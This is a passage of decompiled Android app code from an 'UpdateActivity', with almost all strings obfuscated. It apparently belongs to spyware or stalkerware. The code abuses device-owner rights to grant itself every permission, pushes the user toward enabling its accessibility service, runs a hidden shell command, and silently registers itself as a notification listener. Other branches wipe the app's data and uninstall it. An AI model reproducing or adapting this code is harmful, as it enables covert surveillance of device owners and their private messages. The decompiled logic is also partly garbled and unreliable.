                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str11, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str11, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str11, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str11, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str11, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str11, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str11, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str10 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        byte[] bArr = punto.f1872w;
        String str2 = AbstractAsyncTaskC1449z2.f3517a;
        new String(bArr);
        final int i11 = 8;
        if (getIntent().getBooleanExtra(AbstractC1387m.m2421h(new byte[]{76, 42, -104, -67, 6, 35, 12, -100, 94, 42, -100}, new byte[]{63, 94, -7, -49, 114, 118, 124, -8}), false)) {
            setContentView(R.layout.activity_update2);
            final int i12 = 5;
            ((Button) findViewById(R.id.button28)).setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

                /* JADX INFO: renamed from: c */
                public final /* synthetic */ UpdateActivity f3455c;

                {
                    this.f3455c = this;
                }

                /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
                /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
                /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
                /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
                /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
                /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
                /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
                /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
                /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    String[] strArr;
                    char c;
                    Boolean bool;
                    Iterator<AccessibilityServiceInfo> it;
                    String string;
                    ComponentName componentName;
                    String strFlattenToString;
                    int i13 = i12;
                    final UpdateActivity updateActivity = this.f3455c;
                    final int i14 = 1;
                    final int i15 = 0;
                    switch (i13) {
                        case 0:
                            String str3 = UpdateActivity.f1678l;
                            updateActivity.finish();
                            break;
                        case 1:
                            String str4 = UpdateActivity.f1678l;
                            AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                            break;
                        case 2:
                            String str5 = UpdateActivity.f1678l;
                            if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                                Context applicationContext = updateActivity.getApplicationContext();
                                try {
                                    strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                                } catch (PackageManager.NameNotFoundException e) {
                                    e.printStackTrace();
                                    strArr = new String[0];
                                }
                                if (strArr != null && strArr.length != 0) {
                                    ArrayList arrayList = new ArrayList();
                                    for (String str6 : strArr) {
                                        if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                            arrayList.add(str6);
                                        }
                                    }
                                    if (!arrayList.isEmpty()) {
                                        ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                    }
                                }
                                List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                                Boolean bool2 = Boolean.FALSE;
                                Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                                while (it2.hasNext()) {
                                    if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                        bool2 = Boolean.TRUE;
                                    }
                                }
                                if (!bool2.booleanValue()) {
                                    AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                                }
                                break;
                            } else {
                                ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                                String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                                DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                                try {
                                    String packageName = updateActivity.getPackageName();
                                    String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                    if (strArr2 != null) {
                                        int length = strArr2.length;
                                        c = 0;
                                        while (i15 < length) {
                                            try {
                                                devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i15], 1);
                                                i15++;
                                            } catch (Exception e6) {
                                                e = e6;
                                                e.printStackTrace();
                                                List<AccessibilityServiceInfo> enabledAccessibilityServiceList3 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                                bool = Boolean.FALSE;
                                                it = enabledAccessibilityServiceList3.iterator();
                                                while (it.hasNext()) {
                                                    if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                        bool = Boolean.TRUE;
                                                    }
                                                }
                                                if (!bool.booleanValue()) {
                                                    AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                                }
                                                DevicePolicyManager devicePolicyManager3 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                                new ComponentName(updateActivity, (Class<?>) DPups.class);
                                                devicePolicyManager3.isDeviceOwnerApp(updateActivity.getPackageName());
                                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                                if (string == null) {
                                                    if (string != null) {
                                                        strFlattenToString = componentName.flattenToString();
                                                    } else {
                                                        strFlattenToString = componentName.flattenToString();
                                                    }
                                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                                } else {
                                                    if (string != null) {
                                                        strFlattenToString = componentName.flattenToString();
                                                    } else {
                                                        strFlattenToString = componentName.flattenToString();
                                                    }
                                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                                }
                                                if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                    ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                    return;
                                                } else if (Build.VERSION.SDK_INT < 29) {
                                                    return;
                                                } else {
                                                    return;
                                                }
                                            }
                                        }
                                    } else {
                                        c = 0;
                                    }
                                } catch (Exception e10) {
                                    e = e10;
                                    c = 0;
                                }
                                List<AccessibilityServiceInfo> enabledAccessibilityServiceList4 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                bool = Boolean.FALSE;
                                it = enabledAccessibilityServiceList4.iterator();
                                while (it.hasNext()) {
                                    if (it.next().getId().equals(updateActivity.getPackageName())) {
                                        bool = Boolean.TRUE;
                                    }
                                }
                                if (!bool.booleanValue()) {
                                    AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                }
                                DevicePolicyManager devicePolicyManager4 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                new ComponentName(updateActivity, (Class<?>) DPups.class);
                                devicePolicyManager4.isDeviceOwnerApp(updateActivity.getPackageName());
                                try {
                                    Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                    break;
                                } catch (IOException unused) {
                                }
                                try {
                                    string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                    componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                    if (string == null && string.contains(componentName.flattenToString())) {
                                        Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                    } else {
                                        if (string != null || string.isEmpty()) {
                                            strFlattenToString = componentName.flattenToString();
                                        } else {
                                            StringBuilder sb = new StringBuilder();
                                            sb.append(string);
                                            byte[] bArr2 = new byte[1];
                                            bArr2[c] = 55;
                                            sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                            sb.append(componentName.flattenToString());
                                            strFlattenToString = sb.toString();
                                        }
                                        Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                        Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                    }
                                } catch (Exception e11) {
                                    Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                                }
                            }
                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                            } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                                break;
                            }
                            break;
                        case 3:
                            String str7 = UpdateActivity.f1678l;
                            C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                            SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                            editorEdit.clear();
                            editorEdit.apply();
                            SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                            editorEdit2.clear();
                            editorEdit2.apply();
                            File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                            if (fileArrListFiles != null) {
                                for (File file : fileArrListFiles) {
                                    file.delete();
                                }
                            }
                            File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                            if (fileArrListFiles2 != null) {
                                int length2 = fileArrListFiles2.length;
                                while (i15 < length2) {
                                    fileArrListFiles2[i15].delete();
                                    i15++;
                                }
                            }
                            break;
                        case 4:
                            updateActivity.f1685h.setEnabled(false);
                            Handler handler = new Handler(Looper.getMainLooper());
                            updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                            while (i14 <= 4) {
                                handler.postDelayed(new RunnableC0010c(updateActivity, i14, 6), ((long) i14) * 2000);
                                i14++;
                            }
                            handler.postDelayed(new Runnable() { // from class: e0.w2
                                @Override // java.lang.Runnable
                                public final void run() {
                                    switch (i15) {
                                        case 0:
                                            String str10 = UpdateActivity.f1678l;
                                            UpdateActivity updateActivity2 = updateActivity;
                                            C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                            String str11 = UpdateActivity.f1678l;
                                            Log.e(str11, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                            try {
                                                Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                                intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                                intent.addFlags(268435456);
                                                updateActivity2.startActivity(intent);
                                                Log.e(str11, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                            } catch (Exception e12) {
                                                Log.e(str11, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                                try {
                                                    Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                    intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                    intent2.addFlags(268435456);
                                                    updateActivity2.startActivity(intent2);
                                                    Log.e(str11, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                                } catch (Exception e13) {
                                                    Log.e(str11, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                    try {
                                                        Log.e(str11, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                        Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                        intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                        intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                        intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                        updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                        Log.e(str11, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                    } catch (Exception e14) {
                                                        Log.e(str11, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                    }
                                                }
                                            }
                                            updateActivity2.f1685h.setEnabled(true);
                                            break;
                                        default:
                                            updateActivity.f1687j = 0;
                                            break;
                                    }
                                }
                            }, 10000L);
                            break;
                        case 5:
                            String str8 = UpdateActivity.f1678l;
                            updateActivity.finish();
                            break;
                        case 6:
                            String str9 = UpdateActivity.f1678l;
